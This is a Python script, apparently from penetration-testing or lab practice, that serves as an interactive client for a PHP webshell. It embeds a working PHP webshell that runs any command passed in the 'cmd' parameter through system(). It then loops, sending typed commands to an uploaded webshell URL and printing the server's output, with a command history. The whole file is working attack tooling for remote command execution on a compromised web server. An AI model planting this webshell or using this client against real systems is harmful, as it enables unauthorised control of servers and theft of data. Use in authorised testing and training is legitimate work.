#!/usr/bin/python3
"""
A very simple webshell client to make use of webshell more confortable.
It's more like a template than a real finished tool.

Provides a convenient prompt with history and completion from history.

Displays the ouput from the system() call.
If things worked well it is between the startSeq and endSeq strings in the 
HTML response.
If these strings are not found in the response then the whole raw HTML
is printed.

If you're using Kali you might have to install/update some python packages
"""

import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory


# Just an example of webshell to be used with
# The webshell variable is actually never used in this script
webshell = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<!-- asdo5426  --><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre><!-- awed0903 -->
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
"""

# Parameters ===================================================================
# Update these to fit your needs

# URL of the webshell
url = 'http://192.168.119.XXX/uploaded_files/webshell.php'

# Delimiters for the system() output
startSeq = '<!-- asdo5426  --><pre>'
endSeq = '</pre><!-- awed0903 -->'

historyFile = './webshell_history'

# Main program =================================================================

promptSession = PromptSession(
    history=FileHistory( historyFile))
s = requests.Session()
while True:
    cmd = promptSession.prompt('webshell> ', auto_suggest=AutoSuggestFromHistory())
    r = s.get( url, params={'cmd':cmd} )
    posStart = r.text.find(startSeq)
    posEnd = r.text.find(endSeq)
    if posEnd == -1:
        posEnd = len(r.text)
    if posStart == -1:
        posStart = 0
    else:
        posStart += len(startSeq)
    print(r.text[posStart:posEnd])

